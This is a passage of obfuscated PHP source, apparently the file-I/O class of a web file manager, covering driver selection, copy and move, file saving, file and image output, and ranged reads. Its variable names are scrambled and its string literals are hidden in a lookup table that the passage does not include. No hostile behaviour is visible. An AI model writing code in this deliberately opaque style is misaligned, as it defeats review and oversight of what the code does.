$üèà±‡[$‰éÊÚˆ[$·æ°Ò‚[33]]] : $‰éÊÚˆ[$·æ°Ò‚[33]], $‰éÊÚˆ[$·æ°Ò‚[35]] == $·æ°Ò‚[91] ? $·æ°Ò‚[1187] : $·æ°Ò‚[1197] . $‰éÊÚˆ[$·æ°Ò‚[56]], $‰éÊÚˆ[$·æ°Ò‚[57]] == $·æ°Ò‚[91] ? $·æ°Ò‚[1198] : $·æ°Ò‚[12]); $şÒóÌ®ò[] = trim(implode($·æ°Ò‚[53], $Àı†Àó¬)); } foreach ($Ÿ¾¸ÈÅ as $ŞÒµŒÈ† => $Œ­Ã·¿) { $ñÏ‚Ç¨¶ = str_replace($·æ°Ò‚[1199] . $‘Ê´Ú¢ . $·æ°Ò‚[11], $·æ°Ò‚[12], $ŞÒµŒÈ†); $˜óÓ¡¬Ä = str_replace(array($·æ°Ò‚[121], $·æ°Ò‚[1018]), $·æ°Ò‚[470], substr($Œ­Ã·¿, stripos($Œ­Ã·¿, $·æ°Ò‚[337]))); if ($ñÏ‚Ç¨¶ == $·æ°Ò‚[1176]) { $‹§ÓìÊó = $·æ°Ò‚[1200] . $‘½â”† . $·æ°Ò‚[1201]; } else { $‹§ÓìÊó = (stripos($ñÏ‚Ç¨¶, $·æ°Ò‚[11]) ? $·æ°Ò‚[1202] : $·æ°Ò‚[12]) . ($·æ°Ò‚[1203] . $ñÏ‚Ç¨¶ . $·æ°Ò‚[1204] . $˜óÓ¡¬Ä); } $şÒóÌ®ò[] = $‹§ÓìÊó; } $è“°¢ = array($·æ°Ò‚[1205] . $‘Ê´Ú¢ . $·æ°Ò‚[1206], $·æ°Ò‚[1207] . $‘Ê´Ú¢ . $·æ°Ò‚[1208], implode($·æ°Ò‚[50] . PHP_EOL, $şÒóÌ®ò), $·æ°Ò‚[1209]); $ß…¿ÃˆÒ = implode(PHP_EOL, $è“°¢); if ($Èû«©©… && $Èû«©©… == $·æ°Ò‚[868]) { return $ß…¿ÃˆÒ; } $Ï¯ÒÃÕë = array($·æ°Ò‚[868] => $ß…¿ÃˆÒ, $·æ°Ò‚[13] => $¶Ş±îîæ); return $Èû«©©… ? $Ï¯ÒÃÕë[$Èû«©©…] : $Ï¯ÒÃÕë; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($ŞÄÙü§¿, $—»ŠéŞÎ) { $ÄÃ„ĞûÒ =& $_SERVER[£ğ°ÖØø]; $µ¨ïâ•Ÿ = $—»ŠéŞÎ; $GLOBALS[$ÄÃ„ĞûÒ[1210]] = $ÄÃ„ĞûÒ[1211] . $ŞÄÙü§¿; Hook::trigger($ÄÃ„ĞûÒ[1211] . $ŞÄÙü§¿ . $ÄÃ„ĞûÒ[1212], $µ¨ïâ•Ÿ); $‘ªïˆë = self::driverMake($—»ŠéŞÎ[0]); if (!$‘ªïˆë) { return !1; } if (method_exists($‘ªïˆë, $ŞÄÙü§¿)) { $Ìı˜åà¢ = @call_user_func_array(array($‘ªïˆë, $ŞÄÙü§¿), $—»ŠéŞÎ); } else { if (method_exists($‘ªïˆë, $ÄÃ„ĞûÒ[1213])) { $Ìı˜åà¢ = @call_user_func_array(array($‘ªïˆë, $ŞÄÙü§¿), $—»ŠéŞÎ); } else { if (method_exists(self, $ŞÄÙü§¿)) { $Ìı˜åà¢ = @call_user_func_array(array(self, $ŞÄÙü§¿), $—»ŠéŞÎ); } else { $Ìı˜åà¢ = call_user_func_array(array(parent, $ŞÄÙü§¿), $—»ŠéŞÎ); } } } Hook::trigger($ÄÃ„ĞûÒ[1211] . $ŞÄÙü§¿ . $ÄÃ„ĞûÒ[1214], $µ¨ïâ•Ÿ, $Ìı˜åà¢); return $Ìı˜åà¢; } public static function init($…—ŸÁŠ) { return self::driverMake($…—ŸÁŠ); } public static function copy($ üŞçšå, $¼çáÓÒş, $µ»À¶ıˆ = false, $áÍĞºÆá = false) { return self::copyMoveStart($ üŞçšå, $¼çáÓÒş, $µ»À¶ıˆ, $_SERVER[£ğ°ÖØø][627], $áÍĞºÆá); } public static function move($Úçõ·Œ, $†Æä€‘È, $á¸‹ªÓ¹ = false, $¼·ú¶‚ö = false) { return self::copyMoveStart($Úçõ·Œ, $†Æä€‘È, $á¸‹ªÓ¹, $_SERVER[£ğ°ÖØø][629], $¼·ú¶‚ö); } private static function copyMoveStart($Œ—èÁËÍ, $’µ¤ãì‹, $âŞâƒ­, $¶´˜³‚Ê, $Çõ†ÈĞ) { $…íÂœà¦ =& $_SERVER[£ğ°ÖØø]; $Ñ¬¢†‘ß = array($Œ—èÁËÍ, $’µ¤ãì‹, $âŞâƒ­, $Çõ†ÈĞ); Hook::trigger($…íÂœà¦[1211] . $¶´˜³‚Ê . $…íÂœà¦[1212], $Ñ¬¢†‘ß); $ò¬ª»ğ½ = self::copyMove($Œ—èÁËÍ, $’µ¤ãì‹, $âŞâƒ­, $¶´˜³‚Ê, $Çõ†ÈĞ); Hook::trigger($…íÂœà¦[1211] . $¶´˜³‚Ê . $…íÂœà¦[1214], $Ñ¬¢†‘ß, $ò¬ª»ğ½); return $ò¬ª»ğ½; } public static function saveFile($ë…ƒĞ‘î, $¦µí‰›ñ, $ì‹î¢Î = true) { $®¢òÍ÷“ =& $_SERVER[£ğ°ÖØø]; $üÛïîƒ = self::info($¦µí‰›ñ); $ºÆôû”Æ = self::driverMake($ë…ƒĞ‘î); $õ„âÍöŠ = self::driverMake($¦µí‰›ñ); $¸§ÕÂ = !1; if ($õ„âÍöŠ->pathParse[$®¢òÍ÷“[1215]]) { $¸§ÕÂ = $õ„âÍöŠ; $á½öéÍİ = $õ„âÍöŠ->pathParse[$®¢òÍ÷“[1215]]; $õ„âÍöŠ = self::driverMake($á½öéÍİ); } if ($ºÆôû”Æ->pathParse[$®¢òÍ÷“[1215]]) { $£™Ë•¬‹ = $ºÆôû”Æ->pathParse[$®¢òÍ÷“[1215]]; $ºÆôû”Æ = self::driverMake($£™Ë•¬‹); } $Ç ÑÊÎ“ = $õ„âÍöŠ->pathFather($¦µí‰›ñ); $ş…Œ‚¡ğ = !0; if (!$ì‹î¢Î && self::driverIsSame($ºÆôû”Æ, $õ„âÍöŠ)) { $ş…Œ‚¡ğ = !1; } $ÙÙÅ»šØ = self::copyFile($ºÆôû”Æ, $ë…ƒĞ‘î, $õ„âÍöŠ, $Ç ÑÊÎ“, $üÛïîƒ[$®¢òÍ÷“[32]], $ş…Œ‚¡ğ); if ($¸§ÕÂ) { $ÙÙÅ»šØ = $¸§ÕÂ->getPathOuter($ÙÙÅ»šØ); } return $ÙÙÅ»šØ; } private static function copyMove($ìÄ³­„, $Ëˆîøƒ¶, $‰ÌÅßÁ§, $”éıÑ¡, $ŠÎáèİ = false) { $»°ÕÀ©ü =& $_SERVER[£ğ°ÖØø]; if (!$ìÄ³­„ || $ìÄ³­„ == $»°ÕÀ©ü[8] || !$Ëˆîøƒ¶) { return !1; } ignore_timeout(); $ğšÛ½Ö» = self::driverMake($ìÄ³­„); $Áç¥‰ÕÈ = self::driverMake($Ëˆîøƒ¶); $¨ø•ãäî = $”éıÑ¡ == $»°ÕÀ©ü[629]; $Öš»Óíû = !1; if ($Áç¥‰ÕÈ->pathParse[$»°ÕÀ©ü[1215]]) { $Öš»Óíû = $Áç¥‰ÕÈ; $Ëˆîøƒ¶ = $Áç¥‰ÕÈ->pathParse[$»°ÕÀ©ü[1215]]; $Áç¥‰ÕÈ = self::driverMake($Ëˆîøƒ¶); } if ($ğšÛ½Ö»->pathParse[$»°ÕÀ©ü[1215]]) { $ìÄ³­„ = $ğšÛ½Ö»->pathParse[$»°ÕÀ©ü[1215]]; $ğšÛ½Ö» = self::driverMake($ìÄ³­„); } self::check($ğšÛ½Ö», $ìÄ³­„, $Áç¥‰ÕÈ, $Ëˆîøƒ¶); Hook::trigger($»°ÕÀ©ü[1216], $ğšÛ½Ö», $ìÄ³­„, $Áç¥‰ÕÈ, $Ëˆîøƒ¶); $ıª°¶šÁ = self::driverIsSame($ğšÛ½Ö», $Áç¥‰ÕÈ); if ($ıª°¶šÁ) { if ($”éıÑ¡ == $»°ÕÀ©ü[629] && !method_exists($Áç¥‰ÕÈ, $»°ÕÀ©ü[1217]) && trim($Ëˆîøƒ¶, $»°ÕÀ©ü[8]) == trim($Áç¥‰ÕÈ->pathFather($ìÄ³­„), $»°ÕÀ©ü[8])) { if ($ğšÛ½Ö»->pathThis($ìÄ³­„) != $ŠÎáèİ && !$ğšÛ½Ö»->isOsDriver()) { return $ğšÛ½Ö»->rename($ìÄ³­„, $ŠÎáèİ); } return $Áç¥‰ÕÈ->getPathOuter($ìÄ³­„); } if (method_exists($Áç¥‰ÕÈ, $”éıÑ¡)) { return $Áç¥‰ÕÈ->{$”éıÑ¡}($ìÄ³­„, $Ëˆîøƒ¶, $‰ÌÅßÁ§, $ŠÎáèİ); } } if ($ıª°¶šÁ && $”éıÑ¡ == $»°ÕÀ©ü[629] && $Áç¥‰ÕÈ->getType() == $»°ÕÀ©ü[109]) { $’Úº¶ß÷ = $Áç¥‰ÕÈ->movePath($ìÄ³­„, $Ëˆîøƒ¶, $ŠÎáèİ); if ($’Úº¶ß÷) { return $’Úº¶ß÷; } } $´©ì¬…İ = $ğšÛ½Ö»->isFile($ìÄ³­„); if (!$´©ì¬…İ && $Áç¥‰ÕÈ->getType() == $»°ÕÀ©ü[821] && $ğšÛ½Ö»->getType() == $»°ÕÀ©ü[109]) { $’Úº¶ß÷ = $Áç¥‰ÕÈ->copyFolderFromIO($ğšÛ½Ö», $ìÄ³­„, $Ëˆîøƒ¶, $‰ÌÅßÁ§, $¨ø•ãäî, $ŠÎáèİ); } else { $’Úº¶ß÷ = self::copyPath($ğšÛ½Ö», $ìÄ³­„, $Áç¥‰ÕÈ, $Ëˆîøƒ¶, $‰ÌÅßÁ§, $¨ø•ãäî, $´©ì¬…İ, $ŠÎáèİ); } if ($’Úº¶ß÷ && $¨ø•ãäî) { $ğšÛ½Ö»->remove($ìÄ³­„); } if ($Öš»Óíû) { $’Úº¶ß÷ = $Öš»Óíû->getPathOuter($’Úº¶ß÷); } return $’Úº¶ß÷; } private static function check($å˜Ãé‚”, $ÆÒëúîå, $ë±ÏÃÑ, &$†‹‰»Í) { $Òé¸ö½ =& $_SERVER[£ğ°ÖØø]; if (self::driverIsSame($å˜Ãé‚”, $ë±ÏÃÑ) && $å˜Ãé‚”->isFolder($ÆÒëúîå) && $å˜Ãé‚”->isParentOf($ÆÒëúîå, $†‹‰»Í)) { show_json(LNG($Òé¸ö½[1218]), !1); } if (!$å˜Ãé‚”->exist($ÆÒëúîå)) { show_json(LNG($Òé¸ö½[108]), !1); } } private static function copyPath($íôÙ¥õŒ, $Î¹–› À, $ê¸ıÜÔê, $Ä™æÕíÉ, $—ˆŸ±ä½, $ô»ÄµÔ˜, $™âØ¿ÍÕ, $çàÓÎ¼ü = false, $‘…Öò¸ğ = true) { $æÜÁúıŸ =& $_SERVER[£ğ°ÖØø]; $äÆ‡û°‹ = empty($çàÓÎ¼ü) && $çàÓÎ¼ü !== $æÜÁúıŸ[228] ? $íôÙ¥õŒ->pathThis($Î¹–› À) : $çàÓÎ¼ü; if ($—ˆŸ±ä½) { $¢™óÂşı = $ê¸ıÜÔê->fileNameExist($Ä™æÕíÉ, $äÆ‡û°‹); $¦Ú°Ú×ı = $äÆ‡û°‹; $äÆ‡û°‹ = $ê¸ıÜÔê->fileNameAuto($Ä™æÕíÉ, $äÆ‡û°‹, $—ˆŸ±ä½, !$™âØ¿ÍÕ); if (!$¢™óÂşı || $¦Ú°Ú×ı != $äÆ‡û°‹) { $—ˆŸ±ä½ = !1; } if ($‘…Öò¸ğ && !$—ˆŸ±ä½) { $ê¸ıÜÔê->_data[$æÜÁúıŸ[1219]] = !0; } } if ($™âØ¿ÍÕ) { return self::copyFile($íôÙ¥õŒ, $Î¹–› À, $ê¸ıÜÔê, $Ä™æÕíÉ, $äÆ‡û°‹, $ô»ÄµÔ˜); } if ($—ˆŸ±ä½ == REPEAT_RENAME_FOLDER) { $—ˆŸ±ä½ = !1; } $ƒƒÖÛĞ¥ = rtrim($Ä™æÕíÉ, $æÜÁúıŸ[8]) . $æÜÁúıŸ[8] . $äÆ‡û°‹; $³˜Ì—Îğ = $ê¸ıÜÔê->mkdir($ê¸ıÜÔê->getPath($ƒƒÖÛĞ¥), $—ˆŸ±ä½); $Ä™æÕíÉ = $ê¸ıÜÔê->getPathInner($³˜Ì—Îğ); $çŸœ¦°– = $íôÙ¥õŒ->listPath($Î¹–› À, !0); $çŸœ¦°– = is_array($çŸœ¦°–) ? $çŸœ¦°– : array($æÜÁúıŸ[86] => array(), $æÜÁúıŸ[85] => array()); $«Ë…ôâØ = array_merge($çŸœ¦°–[$æÜÁúıŸ[86]], $çŸœ¦°–[$æÜÁúıŸ[85]]); foreach ($«Ë…ôâØ as $òúÓ²ñ¶) { $à¡–ÌÓ± = $òúÓ²ñ¶[$æÜÁúıŸ[33]] == $æÜÁúıŸ[230]; $Î¹–› À = $íôÙ¥õŒ->getPathInner($òúÓ²ñ¶[$æÜÁúıŸ[87]]); $ÈØâÅÒ­ = self::copyPath($íôÙ¥õŒ, $Î¹–› À, $ê¸ıÜÔê, $Ä™æÕíÉ, $—ˆŸ±ä½, $ô»ÄµÔ˜, $à¡–ÌÓ±, !1, !1); if (!$ÈØâÅÒ­) { IO::errorTips($æÜÁúıŸ[1220] . $Î¹–› À . $æÜÁúıŸ[73] . $Ä™æÕíÉ); } } self::copyMoveKeepInfo($íôÙ¥õŒ, $Î¹–› À, $³˜Ì—Îğ); return $³˜Ì—Îğ; } private static function copyFile($¢Ä£×œº, $¬ô‘¢š‘, $×ŞğóÊ¦, $¸‡–°Ä’, $¦íâíëŒ, $ĞïÁÙô×) { $¶§Å²Î© =& $_SERVER[£ğ°ÖØø]; $¸‡–°Ä’ = $×ŞğóÊ¦->getPath(rtrim($¸‡–°Ä’, $¶§Å²Î©[8]) . $¶§Å²Î©[8] . $¦íâíëŒ); $Î¿üÚ¤È = $¶§Å²Î©[1221] . time() . rand_string(5); Hook::trigger($¶§Å²Î©[1222], $¢Ä£×œº, $¬ô‘¢š‘, $×ŞğóÊ¦, $¸‡–°Ä’, $¦íâíëŒ, $Î¿üÚ¤È); if (self::driverIsSame($¢Ä£×œº, $×ŞğóÊ¦)) { if ($ĞïÁÙô×) { $İ‹ıµî· = $×ŞğóÊ¦->moveFile($¬ô‘¢š‘, $¸‡–°Ä’); } else { $İ‹ıµî· = $×ŞğóÊ¦->copyFile($¬ô‘¢š‘, $¸‡–°Ä’); } Hook::trigger($¶§Å²Î©[1223], $¢Ä£×œº, $¬ô‘¢š‘, $×ŞğóÊ¦, $¸‡–°Ä’, $¦íâíëŒ, $İ‹ıµî·); self::copyMoveKeepInfo($¢Ä£×œº, $¬ô‘¢š‘, $İ‹ıµî·); return $İ‹ıµî·; } $³Ô¹Ü°Á = TEMP_FILES; if ($GLOBALS[$¶§Å²Î©[6]][$¶§Å²Î©[92]][$¶§Å²Î©[860]]) { $³Ô¹Ü°Á = $GLOBALS[$¶§Å²Î©[6]][$¶§Å²Î©[92]][$¶§Å²Î©[860]]; } $€ÆÅ†— = $³Ô¹Ü°Á; mk_dir($€ÆÅ†—); $“ÂóìÆÀ = $€ÆÅ†— . $Î¿üÚ¤È; $ñúİ„—‰ = $“ÂóìÆÀ; $“ÂóìÆÀ = $¢Ä£×œº->download($¬ô‘¢š‘, $“ÂóìÆÀ); $“ÂóìÆÀ = $¢Ä£×œº->iconvApp($“ÂóìÆÀ); if (substr($“ÂóìÆÀ, strlen($³Ô¹Ü°Á)) == $³Ô¹Ü°Á) { $ĞïÁÙô× = !0; } $İ‹ıµî· = $×ŞğóÊ¦->upload($¸‡–°Ä’, $“ÂóìÆÀ, $ĞïÁÙô×); self::remove($ñúİ„—‰); Hook::trigger($¶§Å²Î©[1223], $¢Ä£×œº, $¬ô‘¢š‘, $×ŞğóÊ¦, $¸‡–°Ä’, $¦íâíëŒ, $İ‹ıµî·); self::copyMoveKeepInfo($¢Ä£×œº, $¬ô‘¢š‘, $İ‹ıµî·); return $İ‹ıµî·; } private static function copyMoveKeepInfo($Š‰’Ì–ó, $ò³Øñí, $åÓıÒ»À) { if (!$åÓıÒ»À) { return; } $Ïˆ´ØÄ = $Š‰’Ì–ó->info($ò³Øñí); if (!is_array($Ïˆ´ØÄ)) { return; } IO::setModifyTime($åÓıÒ»À, $Ïˆ´ØÄ[$_SERVER[£ğ°ÖØø][88]]); } public static function pathFather($ì¯ü¡ëù) { $ûÓÍ¯êó = IO::init($ì¯ü¡ëù); $÷àªîú÷ = $ûÓÍ¯êó->pathFather($ûÓÍ¯êó->path); return $ûÓÍ¯êó->getPathOuter($÷àªîú÷); } public static function fileOut($„Ä»´òÏ, $Ğ°²¤ã = false, $ºŠ Îö = false, $§ı’úåï = '') { $È¢““‘î = self::driverMake($„Ä»´òÏ); if ($È¢““‘î->isFileOutServer()) { return $È¢““‘î->fileOutServer($„Ä»´òÏ, $Ğ°²¤ã, $ºŠ Îö, $§ı’úåï); } return $È¢““‘î->fileOut($„Ä»´òÏ, $Ğ°²¤ã, $ºŠ Îö, $§ı’úåï); } public static function fileOutImage($Ç–Ø¤÷ç, $ìÜƒš¥Ê = 250) { $±æº¥èİ = array(250, 600, 1200, 2000, 3000, 5000); for ($€ù ™§ = 0; $€ù ™§ < count($±æº¥èİ); $€ù ™§++) { if ($€ù ™§ == 0 && $ìÜƒš¥Ê <= $±æº¥èİ[$€ù ™§]) { $ìÜƒš¥Ê = $±æº¥èİ[$€ù ™§]; break; } else { if ($ìÜƒš¥Ê > $±æº¥èİ[$€ù ™§ - 1] && $ìÜƒš¥Ê <= $±æº¥èİ[$€ù ™§]) { $ìÜƒš¥Ê = $±æº¥èİ[$€ù ™§]; break; } else { if ($€ù ™§ == count($±æº¥èİ) - 1 && $ìÜƒš¥Ê > $±æº¥èİ[$€ù ™§]) { $ìÜƒš¥Ê = $±æº¥èİ[$€ù ™§]; break; } } } } $Ú„û¢ºœ = self::driverMake($Ç–Ø¤÷ç); if ($Ú„û¢ºœ->isFileOutServer()) { return $Ú„û¢ºœ->fileOutImageServer($Ç–Ø¤÷ç, $ìÜƒš¥Ê); } return $Ú„û¢ºœ->fileOutImage($Ç–Ø¤÷ç, $ìÜƒš¥Ê); } private static function driverIsSame($ÇÆÖ€å, $ôîúÏ) { $¼êÀÔ“” =& $_SERVER[£ğ°ÖØø]; $èÊ™š¢Ù = $ÇÆÖ€å->getType(); $½âÖóç± = $ôîúÏ->getType(); if ($èÊ™š¢Ù != $½âÖóç±) { return !1; } if ($èÊ™š¢Ù == $¼êÀÔ“”[821]) { return !0; } if ($èÊ™š¢Ù == $¼êÀÔ“”[109]) { return !0; } if ($ÇÆÖ€å->pathDriver == $ôîúÏ->pathDriver) { return !0; } return !1; } public static function copyUpdate($ÇÉ×Ä˜, $øÇ£ùâØ) { $´ÍİÅ¤î =& $_SERVER[£ğ°ÖØø]; if (!IO::exist($ÇÉ×Ä˜)) { return !1; } if (!IO::exist($øÇ£ùâØ)) { IO::mkdir($øÇ£ùâØ); } $»ï•×õ· = array_to_keyvalue(self::listAllSimple($ÇÉ×Ä˜), $´ÍİÅ¤î[87]); $Ò¹„·ÆÖ = array_to_keyvalue(self::listAllSimple($øÇ£ùâØ), $´ÍİÅ¤î[87]); $şØÕ³÷ = array(); $İşïÕõó = array(); foreach ($»ï•×õ· as $íÊÇ› => $àÉŠ…˜Û) { if (isset($Ò¹„·ÆÖ[$íÊÇ›])) { if ($àÉŠ…˜Û[$´ÍİÅ¤î[78]] == 1) { continue; } if ($Ò¹„·ÆÖ[$íÊÇ›][$´ÍİÅ¤î[79]] == $àÉŠ…˜Û[$´ÍİÅ¤î[79]]) { continue; } } if ($àÉŠ…˜Û[$´ÍİÅ¤î[78]] == 1) { $İşïÕõó[] = $øÇ£ùâØ . $´ÍİÅ¤î[8] . trim($íÊÇ›, $´ÍİÅ¤î[8]); continue; } $ÖÚÇ˜Ù = strstr(trim($íÊÇ›, $´ÍİÅ¤î[8]), $´ÍİÅ¤î[8]) ? get_path_father($íÊÇ›) : $´ÍİÅ¤î[12]; $şØÕ³÷[] = array($´ÍİÅ¤î[1224] => $àÉŠ…˜Û[$´ÍİÅ¤î[89]], $´ÍİÅ¤î[1225] => rtrim($øÇ£ùâØ, $´ÍİÅ¤î[8]) . $´ÍİÅ¤î[8] . $ÖÚÇ˜Ù, $´ÍİÅ¤î[1226] => $àÉŠ…˜Û); } $ûÓ¡×Œ° = array($´ÍİÅ¤î[230] => $şØÕ³÷, $´ÍİÅ¤î[78] => $İşïÕõó); Hook::trigger($´ÍİÅ¤î[1227], $ÇÉ×Ä˜, $øÇ£ùâØ, $ûÓ¡×Œ°); foreach ($İşïÕõó as $àÉŠ…˜Û) { IO::mkdir($àÉŠ…˜Û); } foreach ($şØÕ³÷ as $àÉŠ…˜Û) { IO::copy($àÉŠ…˜Û[$´ÍİÅ¤î[1224]], $àÉŠ…˜Û[$´ÍİÅ¤î[1225]], REPEAT_REPLACE); } } public static function fileSubstr($×Àˆ™âÕ, $Üš…²í, $öËıˆ¶ = false) { $ø²€Š‹ª =& $_SERVER[£ğ°ÖØø]; $îÊùø¦â = self::driverMake($×Àˆ™âÕ); $±Œ‚æÕ = $îÊùø¦â->size($×Àˆ™âÕ); $¬ĞÚåç = $Üš…²í; $ÙØÖšš³ = $öËıˆ¶; if ($Üš…²í < 0) { $Üš…²í = $±Œ‚æÕ + $Üš…²í; } if ($öËıˆ¶ === !1) { $öËıˆ¶ = $±Œ‚æÕ - $Üš…²í; } if ($Üš…²í + $öËıˆ¶ > $±Œ‚æÕ) { $öËıˆ¶ = $±Œ‚æÕ - $Üš…²í; } if (!$±Œ‚æÕ && $îÊùø¦â->getType() == $ø²€Š‹ª[109] && !$îÊùø¦â->exist($×Àˆ™âÕ)) { $®áğ•êâ = get_path_this($×Àˆ™âÕ); $Éá»‘ï« = parse_url_query($®áğ•êâ); if (is_array($Éá»‘ï«) && isset($Éá»‘ï«[$ø²€Š‹ª[32]])) { $®áğ•êâ = urldecode($Éá»‘ï«[$ø²€Š‹ª[32]]); } throw new Exception($ø²€Š‹ª[1228] . LNG($ø²€Š‹ª[1229]) . $ø²€Š‹ª[1027] . clear_html($®áğ•êâ) . $ø²€Š‹ª[12]); } if ($öËıˆ¶ <= 0) { return $ø²€Š‹ª[12]; } if ($Üš…²í < 0 || $Üš…²í >= $±Œ‚æÕ || $öËıˆ¶ > 1024 * 1024 * 10) { throw new Exception("\x66\151\154\x65\x52\x65\x61\144\x20\145\162\162\157\162\41\x20\163\x74\141\x72\164\75{$Üš…²í}\x3b\154\145\156\147\x74\150\75{$öËıˆ¶}\x3b\40\163\151\x7a\145\x3d{$±Œ‚æÕ}\73"); } $‘©ƒ‚š = $îÊùø¦â->fileSubstr($×Àˆ™âÕ, $Üš…²í, $öËıˆ¶); if (!$‘©ƒ‚š && $öËıˆ¶ && isset($GLOBALS[$ø²€Š‹ª[1230]])) { throw new Exception($GLOBALS[$ø²€Š‹ª[1230]][$ø²€Š‹ª[1231]]); } return $‘©ƒ‚š; } private static function driverMake(&$ë“Æ’àø) { $ÀàóìŒ =& $_SERVER[£ğ°ÖØø]; $¿ò¡æù› = KodIO::parse($ë“Æ’àø); if (!self::$driverListSystem) { $ßãœ¿® = Model($ÀàóìŒ[831])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($ßãœ¿®, $ÀàóìŒ[484]); } if ($¿ò¡æù›[$ÀàóìŒ[33]] == KodIO::KOD_IO && !self::$driverListSystem[$¿ò¡æù›[$ÀàóìŒ[484]]]) { throw new Exception($ÀàóìŒ[1232]); return !1; } $ë“Æ’àø = $¿ò¡æù›[$ÀàóìŒ[1233]]; $º¿¬Åï¼ = self::driverGet($¿ò¡æù›, $ë“Æ’àø); return $º¿¬Åï¼; } private static function driverGet($ÈÁÉ´»¨, &$ÍÖ×Û®Ş) { $ÁôĞö¢Å =& $_SERVER[£ğ°ÖØø]; $‘ªŠá·Ì = $ÈÁÉ´»¨[$ÁôĞö¢Å[1234]]; $ŞÂÆ¡Ø = $ÈÁÉ´»¨[$ÁôĞö¢Å[484]]; switch ($ÈÁÉ´»¨[$ÁôĞö¢Å[33]]) { case KodIO::KOD_IO: $²Í†ù‘ß = self::$driverListSystem[$ŞÂÆ¡Ø]; break; case KodIO::KOD_SOURCE: $ÍÖ×Û®Ş = $ŞÂÆ¡Ø . $ÍÖ×Û®Ş; $²Í†ù‘ß = array($ÁôĞö¢Å[1235] => $ÁôĞö¢Å[1236], $ÁôĞö¢Å[6] => $ÈÁÉ´»¨); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $ ƒ¹³ûÀ = $GLOBALS[$ÁôĞö¢Å[1237]]; self::$driverListUser = array_to_keyvalue($ ƒ¹³ûÀ, $ÁôĞö¢Å[484]); } $²Í†ù‘ß = self::$driverListUser[$ŞÂÆ¡Ø]; break; case KodIO::KOD_SHARE_LINK: $²Í†ù‘ß = array($ÁôĞö¢Å[1235] => $ÁôĞö¢Å[1238], $ÁôĞö¢Å[6] => $ÈÁÉ´»¨); $µÎüëûó = Action($ÁôĞö¢Å[1239])->sharePathInfo($ÈÁÉ´»¨[$ÁôĞö¢Å[87]]); $ÍÖ×Û®Ş = $µÎüëûó[$ÁôĞö¢Å[193]]; if (!$µÎüëûó[$ÁôĞö¢Å[193]]) { $ú‹¦æêË = Model($ÁôĞö¢Å[673])->getInfo($µÎüëûó[$ÁôĞö¢Å[674]]); $ÍÖ×Û®Ş = KodIO::clear($ú‹¦æêË[$ÁôĞö¢Å[1240]] . $ÈÁÉ´»¨[$ÁôĞö¢Å[1233]]); $ÈÁÉ´»¨[$ÁôĞö¢Å[569]] = $ú‹¦æêË; $ÈÁÉ´»¨[$ÁôĞö¢Å[1215]] = $ÍÖ×Û®Ş; $²Í†ù‘ß = array($ÁôĞö¢Å[1235] => $ÁôĞö¢Å[1241], $ÁôĞö¢Å[6] => $ÈÁÉ´»¨); } break; case KodIO::KOD_SHARE_ITEM: $²Í†ù‘ß = array($ÁôĞö¢Å[1235] => $ÁôĞö¢Å[1242], $ÁôĞö¢Å[6] => $ÈÁÉ´»¨); $ú‹¦æêË = Model($ÁôĞö¢Å[673])->getInfo($ÈÁÉ´»¨[$ÁôĞö¢Å[484]]); if ($ú‹¦æêË[$ÁôĞö¢Å[193]] == $ÁôĞö¢Å[228]) { $ÍÖ×Û®Ş = KodIO::clear($ú‹¦æêË[$ÁôĞö¢Å[1240]] . $ÈÁÉ´»¨[$ÁôĞö¢Å[1233]]); $ÈÁÉ´»¨[$ÁôĞö¢Å[569]] = $ú‹¦æêË; $ÈÁÉ´»¨[$ÁôĞö¢Å[1215]] = $ÍÖ×Û®Ş; $²Í†ù‘ß = array($ÁôĞö¢Å[1235] => $ÁôĞö¢Å[1243], $ÁôĞö¢Å[6] => $ÈÁÉ´»¨); } else { if (!$ÍÖ×Û®Ş) { $ÍÖ×Û®Ş = $ú‹¦æêË[$ÁôĞö¢Å[193]]; } } break; default: $ÍÖ×Û®Ş = $ÈÁÉ´»¨[$ÁôĞö¢Å[87]]; $²Í†ù‘ß = array($ÁôĞö¢Å[1235] => $ÁôĞö¢Å[1244]); break; } $åİ±–Í = $ÈÁÉ´»¨[$ÁôĞö¢Å[87]]; if (!isset(self::$driverCache[$åİ±–Í])) { $Æ»Ù¨·¥ = strtolower($²Í†ù‘ß[$ÁôĞö¢Å[98]]); $Ÿ œò® = $GLOBALS[$ÁôĞö¢Å[6]][$ÁôĞö¢Å[92]][$ÁôĞö¢Å[889]]; $ğ²Ö÷Ğó = $ÁôĞö¢Å[77] . (isset($Ÿ œò®[$Æ»Ù¨·¥]) ? $Ÿ œò®[$Æ»Ù¨·¥] : ucfirst($Æ»Ù¨·¥)); if (!class_exists($ğ²Ö÷Ğó)) { show_json("{$ğ²Ö÷Ğó}\40\x6e\x6f\164\40\x65\170\x69\163\x74\x73\x21", !1); } $„‹›Èºç = isset($²Í†ù‘ß[$ÁôĞö¢Å[6]]) ? $²Í†ù‘ß[$ÁôĞö¢Å[6]] : !1; self::$driverCache[$åİ±–Í] = new $ğ²Ö÷Ğó($„‹›Èºç); } $ø˜ŒÁÉ = self::$driverCache[$åİ±–Í]; $ø˜ŒÁÉ->pathDriver = $‘ªŠá·Ì; $ø˜ŒÁÉ->pathBase = $ÁôĞö¢Å[12]; if (isset($²Í†ù‘ß[$ÁôĞö¢Å[6]][$ÁôĞö¢Å[1245]])) { $ø˜ŒÁÉ->pathBase = rtrim($²Í†ù‘ß[$ÁôĞö¢Å[6]][$ÁôĞö¢Å[1245]], $ÁôĞö¢Å[8]) . $ÁôĞö¢Å[8]; $ÍÖ×Û®Ş = $ø˜ŒÁÉ->pathBase . ltrim($ÍÖ×Û®Ş, $ÁôĞö¢Å[8]); } $ÍÖ×Û®Ş = $ø˜ŒÁÉ->getPath($ÍÖ×Û®Ş); if (isset($ÈÁÉ´»¨[$ÁôĞö¢Å[1215]])) { $ÍÖ×Û®Ş = $ÈÁÉ´»¨[$ÁôĞö¢Å[1215]]; } $ø˜ŒÁÉ->path = $ÍÖ×Û®Ş; return $ø˜ŒÁÉ; } public static function errorTips($–Ä§û¾É = false) { $ÃÄğßä =& $_SERVER[£ğ°ÖØø]; static $¾åâÀâ = array(); $«·Â«› = 1000; if ($–Ä§û¾É === -1) { return $¾åâÀâ ? $¾åâÀâ[count($¾åâÀâ) - 1] : $ÃÄğßä[12]; } if ($–Ä§û¾É === !1) { return implode($ÃÄğßä[262], $¾åâÀâ); } if 